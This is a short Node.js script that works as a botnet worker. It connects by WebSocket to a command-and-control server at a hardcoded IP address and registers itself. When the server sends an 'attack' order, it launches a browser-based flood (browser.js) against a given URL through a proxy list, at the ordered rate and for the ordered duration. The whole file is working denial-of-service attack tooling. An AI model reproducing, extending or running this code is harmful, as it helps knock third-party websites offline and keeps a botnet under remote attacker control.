const WebSocket = require('ws');
const { spawn } = require('child_process');

const CNC_URL = 'ws://185.242.3.160:1996/worker';
const WORKER_NAME = 'worker1';
const PROXY_FILE = '/root/browser/proxies.txt';   // Ruta fija de las proxies
const THREADS = 8;                          // Fijo según tu servidor

let ws;

function connect() {
    ws = new WebSocket(CNC_URL);
    ws.on('open', () => {
        console.log('[Worker] Connected to CNC');
        ws.send(JSON.stringify({ type: 'register', name: WORKER_NAME }));
    });
    ws.on('message', (data) => {
        const msg = JSON.parse(data);
        if (msg.type === 'attack' && msg.method === 'browser') {
            const { url, rate, duration, user } = msg;
            console.log(`[Attack] Received from ${user}: ${url} rate=${rate} time=${duration}s`);
            const args = [url, THREADS, PROXY_FILE, rate, duration];
            const child = spawn('node', ['browser.js', ...args], { stdio: 'pipe' });
            child.stdout.on('data', (data) => {
                console.log(`[browser stdout] ${data.toString().trim()}`);
            });
            child.stderr.on('data', (data) => {
                console.error(`[browser stderr] ${data.toString().trim()}`);
            });
            child.on('close', (code) => {
                console.log(`[Attack] Finished with code ${code}`);
            });
        }
    });
    ws.on('close', () => {
        console.log('[Worker] Disconnected, reconnecting in 5s...');
        setTimeout(connect, 5000);
    });
    ws.on('error', (err) => {
        console.error('[Worker] WebSocket error:', err.message);
    });
}

connect();
